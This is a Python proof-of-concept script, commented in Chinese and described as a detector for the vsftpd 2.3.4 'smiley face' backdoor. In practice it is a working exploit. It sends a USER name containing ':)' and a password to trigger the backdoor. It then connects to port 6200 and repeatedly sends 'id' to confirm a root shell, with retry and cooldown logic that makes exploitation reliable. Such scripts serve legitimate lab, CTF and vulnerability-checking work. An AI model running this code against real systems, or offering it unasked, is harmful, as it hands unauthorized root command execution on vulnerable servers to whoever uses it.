import argparse
import socket
import sys
import time

# 探测结果
OK = "ok"                 # 拿到 uid= 特征，漏洞确认
SILENT = "silent"         # 连上了但没回显：端口有人听，但进程还没走到 accept()
REFUSED = "refused"       # 连不上/被 RST：6200 上根本没有监听


def recv_all(sock: socket.socket, timeout: float = 3.0) -> bytes:
    """尽量读完当前可读数据，避免卡死在 recv 上"""
    sock.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    except ConnectionResetError:
        # 后门只服务一次连接；机会被别人用掉、或靶机进程已经换掉时会对端 RST。
        # 这属于"这次没抢到"，不是脚本崩溃的理由。
        pass
    return data


def trigger_backdoor(target: str, ftp_port: int = 21) -> str:
    """
    第一步：连接 FTP 服务，发送带 ":)" 的用户名 + 任意密码。

    真正的触发点在特权进程的口令校验路径（privops.c 的
    vsf_sysdep_check_auth → str_contains_space），所以必须把 USER 和
    PASS 都发完，后门才会执行；只发 USER 靶机回 331 但不会开 6200。

    返回值用于判读 PASS 阶段发生了什么：
      "blocked" —— PASS 读超时，特权进程阻塞在 accept()，后门监听已建立
      "oops"    —— 收到 500 OOPS: priv_sock_get_result，说明特权进程自己
                   exit(1) 了（多半是 bind(6200) 失败，端口还被上一次后门占着）
      "other"   —— 其它响应
    """
    print(f"[*] 连接 {target}:{ftp_port} (FTP)")
    try:
        s = socket.create_connection((target, ftp_port), timeout=5)
    except OSError as e:
        print(f"[!] 无法连接 FTP 端口: {e}")
        return "dead"
    banner = recv_all(s)
    print(f"[*] FTP Banner: {banner.decode(errors='ignore').strip()}")
    # 用户名中携带触发字符串 ":)"，且首位必须是字母/数字/下划线/点
    s.sendall(b"USER test:)\r\n")
    print(f"[*] USER 响应: {recv_all(s).decode(errors='ignore').strip()}")
    s.sendall(b"PASS test\r\n")
    resp = recv_all(s, timeout=4).decode(errors="ignore").strip()
    s.close()
    if not resp:
        print("[*] PASS 响应: (无响应，超时) —— 特权进程阻塞在 accept()，符合预期")
        return "blocked"
    print(f"[*] PASS 响应: {resp}")
    if "OOPS" in resp:
        print("[!] 特权进程已退出（bind 6200 失败），本次触发没有产生可用后门")
        return "oops"
    return "other"


def probe_backdoor_shell(target: str, backdoor_port: int = 6200,
                         sends: int = 4, wait: float = 3.0):
    """
    第二步：连后门端口，反复发 id 直到拿到回显。

    需要重发是因为慢速靶机（虚拟机、软件模拟）上，从 PASS 到进程真正走到
    accept() 有几秒延迟；这期间连接能建立（进 backlog）但没人读我们发过去的数据，
    等它开始 accept 时重发一次就有了。
    """
    try:
        s = socket.create_connection((target, backdoor_port), timeout=5)
    except OSError as e:
        print(f"[*] {backdoor_port} 端口连不上: {e}")
        return REFUSED, ""
    output = ""
    try:
        for i in range(1, sends + 1):
            s.sendall(b"id\n")
            output = recv_all(s, timeout=wait + 2).decode(errors="ignore").strip()
            print(f"[*] 第 {i}/{sends} 次发送 id，回显: {output or '(空)'}")
            if "uid=" in output:
                return OK, output
            time.sleep(wait)
    finally:
        s.close()
    return SILENT, output


def check_backdoor_shell(target: str, ftp_port: int = 21,
                         backdoor_port: int = 6200,
                         attempts: int = 4, cooldown: float = 12.0) -> bool:
    """
    触发 + 探测，最多 attempts 轮。

    两个必须留冷却的理由：
      1) 一次触发只服务一个连接（accept 后立刻 execl 把进程换掉），
         上一次的机会没消费干净时，新的触发会 bind 失败并 exit(1)；
      2) 靶机慢的时候，6200 从 bind 到 accept 的延迟是秒级，
         立刻重试只会自己把端口占着，越试越糟。
    """
    for i in range(1, attempts + 1):
        print(f"\n[*] ===== 第 {i}/{attempts} 轮 =====")
        state = trigger_backdoor(target, ftp_port)
        if state == "dead":
            return False
        time.sleep(2)
        result, output = probe_backdoor_shell(target, backdoor_port)
        if result == OK:
            print(f"[+] 拿到命令回显：{output}")
            print("[+] 确认存在笑脸漏洞（vsftpd 2.3.4 后门），且为 root 权限 shell")
            return True
        print(f"[-] 本轮未确认（{result}），等 {cooldown:.0f} 秒让上一次的状态释放")
        if i < attempts:
            time.sleep(cooldown)
    print("[-] 多轮触发仍未拿到预期回显，判定为不存在或不可利用")
    return False


def main():
    parser = argparse.ArgumentParser(description="笑脸漏洞(vsftpd 2.3.4 后门)检测 PoC")
    parser.add_argument("-t", "--target", required=True, help="目标IP，如 127.0.0.1")
    parser.add_argument("--ftp-port", type=int, default=21, help="FTP端口，默认21")
    parser.add_argument("--backdoor-port", type=int, default=6200, help="后门端口，默认6200")
    parser.add_argument("--attempts", type=int, default=4, help="最多触发几轮，默认4")
    parser.add_argument("--cooldown", type=float, default=12.0,
                        help="两轮触发之间等待的秒数，默认12")
    args = parser.parse_args()

    print("=" * 60)
    print("笑脸漏洞 (vsftpd v2.3.4 backdoor) 检测 PoC")
    print("=" * 60)

    result = check_backdoor_shell(args.target, args.ftp_port,
                                  args.backdoor_port, args.attempts,
                                  args.cooldown)
    sys.exit(0 if result else 1)


if __name__ == "__main__":
    main()
